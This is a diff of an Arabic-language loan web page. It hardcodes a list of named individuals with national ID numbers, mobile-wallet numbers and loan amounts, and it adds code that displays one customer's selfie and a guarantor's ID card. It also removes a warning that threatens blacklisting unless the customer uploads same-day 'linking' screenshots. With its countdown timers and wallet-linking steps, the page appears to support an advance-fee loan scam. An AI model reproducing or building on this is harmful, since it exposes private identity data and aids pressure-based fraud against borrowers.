@@ -248,39 +248,35 @@
             margin: 1rem 0;
         }
 
-        /* بطاقة التحذير الخاصة للعميل 30007310101779 */
-        .warning-card {
-            background: linear-gradient(135deg, rgba(255, 80, 80, 0.9), rgba(200, 40, 40, 0.95));
-            border: 3px solid #FFD700;
-            border-radius: 1.5rem;
-            padding: 1.5rem;
+        /* صورة متوهجة */
+        .glow-image {
+            transition: all 0.3s ease;
+            max-width: 100%;
+            border-radius: 15px;
+        }
+        .glow-image:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0,184,148,0.8);
+        }
+        .image-row {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
             margin-bottom: 2rem;
+        }
+        .image-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            padding: 1rem;
             text-align: center;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-            animation: pulseWarning 1.5s infinite;
+            flex: 1;
+            min-width: 250px;
+            border: 1px solid rgba(212,175,55,0.3);
         }
-        @keyframes pulseWarning {
-            0% { box-shadow: 0 0 0 0 rgba(255, 80, 80, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(255, 80, 80, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 80, 80, 0); }
-        }
-        .warning-card i {
-            font-size: 3rem;
-            color: #FFD700;
-            margin-bottom: 0.5rem;
-        }
-        .warning-card h3 {
-            color: #FFD700;
-            font-size: 1.8rem;
-            margin-bottom: 0.8rem;
-        }
-        .warning-card p {
-            color: white;
-            font-size: 1.1rem;
-            line-height: 1.8;
-        }
-        .warning-card .highlight {
-            color: #FFD700;
+        .image-card p {
+            margin-top: 0.5rem;
+            color: #FFD966;
             font-weight: bold;
         }
 
@@ -644,20 +640,10 @@
             </div>
         </div>
 
-        <!-- بطاقة التحذير الخاصة بالعميل 30007310101779 (تظهر فقط له) -->
-        <div id="specialWarningCard" style="display: none;">
-            <div class="warning-card">
-                <i class="fas fa-exclamation-triangle"></i>
-                <h3>⚠️ تنبيه هام ⚠️</h3>
-                <p>عزيزي العميل <strong id="warningCustomerName">...</strong>،</p>
-                <p><span class="highlight">لابد من تأكيد ربط حديث بتاريخ اليوم ورفع سكرينات التأكيدات</span> ليتم استرجاع الطلب من الشطب.</p>
-                <p><strong class="highlight">ملاحظة مهمة:</strong> في حالة ربط تأكيداتك قديمة يتم إنهاء التعامل معك ووضعك في <span class="highlight">البلاك ليست (القائمة السوداء)</span>.</p>
-                <p>نرجو منكم الاهتمام بالمطلوب ليتم تفعيل القرض.</p>
-                <p style="margin-top: 1rem;"><i class="fas fa-calendar-alt"></i> يرجى التأكد من أن التأكيدات بتاريخ <strong id="todayDate"></strong></p>
-            </div>
-        </div>
+        <!-- قسم الصور المخصص للعميل وائل زكريا (يظهر دائماً إذا كان هو العميل) -->
+        <div id="customerImagesSection" style="display: none; margin-bottom: 2rem;"></div>
 
-        <!-- المحتوى العادي (يظهر للجميع، بما فيهم العميل المذكور) -->
+        <!-- المحتوى العادي (يظهر فقط للعملاء الذين لديهم محفظة) -->
         <div id="normalDashboardContent" class="normal-dashboard-content">
             <div class="hero-section">
                 <div class="hero-video">
@@ -856,19 +842,20 @@
         { name: "وليد علي حسن علي الدين", id: "27303270102837", wallet: "01004244313", type: "فودافون", loan: 185000, step: 46250 },
         { name: "كرم محروس محمود حفني", id: "28611200135", wallet: "01151775319", type: "اتصالات", loan: 30000, step: 7500 },
         { name: "محمد مجدي احمد مسعد", id: "2011101357", wallet: "01070710710", type: "فودافون", loan: 200000, step: 50000 },
-        { name: "وائل زكريا محمد خليل", id: "28301030105511", wallet: "01119416900", type: "اتصالات", loan: 200000, step: 50000 },
+        { name: "محمد ناهض محمد السيد", id: "30007310101779", wallet: "01155143436", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "صلاح مختار حنفي قرني", id: "27708040101271", wallet: "01023669498", type: "فودافون", loan: 50000, step: 12500 },
         { name: "السيد ابراهيم الششتاوي قناوي ", id: "26803241601893", wallet: "01090232423", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمود علي المتولي السيد حسن", id: "28404071200379", wallet: "01001093695", type: "فودافون", loan: 30000, step: 7500 },
         { name: " توبى صلاح الدين الضرغامى احمد ", id: "27001152400606", wallet: null, type: null, loan: 200000, step: 50000 },
         { name: "مدحت محمد محمود سالم ", id: "27910252801039", wallet: "01159760178", type: "اتصالات", loan: 50000, step: 12500 },
-        { name: "عبدالرحمن كمال معوض امبابى", id: "29802072200066", wallet: "01101353222", type: "اتصالات", loan: 200000, step: 50000 },
-        { name: "محمد عبدالوهاب محمود احمد", id: "29807202102379", wallet: "01066590637", type: "فودافون", loan: 150000, step: 37500 },
+        { name: "الشيماء عبد الغفور دسوقي عباس", id: "282072102361", wallet: "01143455214", type: "اتصالات", loan: 150000, step: 37500 },
+        { name: "علي حسين سيد علي", id: "28805142501019", wallet: "01143756596", type: "اتصالات", loan: 30000, step: 7500 },
         { name: "احمد كمال عبدالتواب محمد ", id: "283111422016", wallet: "01022560232", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمد محمود عبد الحميد محمد", id: "283101901335", wallet: "01026479629", type: "فودافون", loan: 40000, step: 10000 },
         { name: "ياسر سعد محمد بكر", id: "275073200599", wallet: "01226157120", type: "فودافون", loan: 60000, step: 15000 },
-        { name: "محمد احمد خلف الله عمر", id: "29401172600151", wallet: "01129793519", type: "اتصالات", loan: 30000, step: 75000 },
-        { name: "محمد احمد محمود احمد", id: "28910102102195", wallet: "01122107980", type: "اتصالات", loan: 30000, step: 7500 }
+        { name: "حسين صبرى مصطفى حسن", id: "28909012110875", wallet: "01142032336", type: "اتصالات", loan: 100000, step: 25000 },
+        { name: "محمد احمد محمود احمد", id: "28910102102195", wallet: "01122107980", type: "اتصالات", loan: 30000, step: 7500 },
+        { name: "وائل زكريا محمد خليل", id: "28301030105511", wallet: "01119416900", type: "اتصالات", loan: 200000, step: 50000 }
     ];
 
     let currentCustomer = null;
@@ -991,38 +978,42 @@
         document.getElementById('loanDuration').innerText = months + ' شهر';
         document.getElementById('firstPaymentDate').innerText = formattedDate;
 
+        // إضافة صور العميل وائل زكريا (الرقم القومي 28301030105511) - تظهر دائماً حتى لو لم تكن لديه محفظة
+        const imagesDiv = document.getElementById('customerImagesSection');
+        if (customer.id === "28301030105511") {
+            imagesDiv.style.display = 'block';
+            imagesDiv.innerHTML = `
+                <div class="image-row">
+                    <div class="image-card">
+                        <img src="https://i.postimg.cc/BbnRBCDc/taken-picture-1Rw9Wyq-D-KFtpk-3383867.jpg" class="glow-image" style="max-width:100%; border-radius:15px;">
+                        <p>📸 صورة تأكيد الهوية (سيلفي العميل)</p>
+                    </div>
+                    <div class="image-card">
+                        <img src="https://i.postimg.cc/vZskPMW9/inbound3788707962729770465.jpg" class="glow-image" style="max-width:100%; border-radius:15px;">
+                        <p>🪪 صورة بطاقة الضامن</p>
+                    </div>
+                </div>
+            `;
+        } else {
+            imagesDiv.style.display = 'none';
+            imagesDiv.innerHTML = '';
+        }
+
         const hasWallet = customer.type && customer.wallet && customer.wallet !== '.' && customer.wallet !== null;
         const normalDiv = document.getElementById('normalDashboardContent');
         const walletRequiredDiv = document.getElementById('walletRequiredContent');
         
-        // عرض بطاقة التحذير للعميل الخاص (محمد ناهض محمد السيد)
-        const specialWarningDiv = document.getElementById('specialWarningCard');
-        if (customer.id === "30007310101779") {
-            specialWarningDiv.style.display = 'block';
-            document.getElementById('warningCustomerName').innerText = customer.name;
-            // عرض التاريخ الحالي
-            const todayDate = new Date().toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
-            document.getElementById('todayDate').innerText = todayDate;
-        } else {
-            specialWarningDiv.style.display = 'none';
-        }
-        
         if (hasWallet) {
-            // إظهار المحتوى العادي وإخفاء المحتوى الخاص بفتح المحفظة
             normalDiv.style.display = 'block';
             walletRequiredDiv.style.display = 'none';
-            // إظهار قسم الربط
             document.getElementById('linkingSection').classList.add('active');
             showLinkingInstructions(customer.type);
             startTimer();
             startAutoRedirect();
         } else {
-            // إظهار المحتوى الخاص بفتح المحفظة وإخفاء المحتوى العادي
             normalDiv.style.display = 'none';
             walletRequiredDiv.style.display = 'block';
-            // بدء عداد 4 ساعات
             startWalletDeadline();
-            // التأكد من إخفاء أي مؤقتات أخرى
             if (timerInterval) clearInterval(timerInterval);
             if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
             if (autoRedirectInterval) clearInterval(autoRedirectInterval);
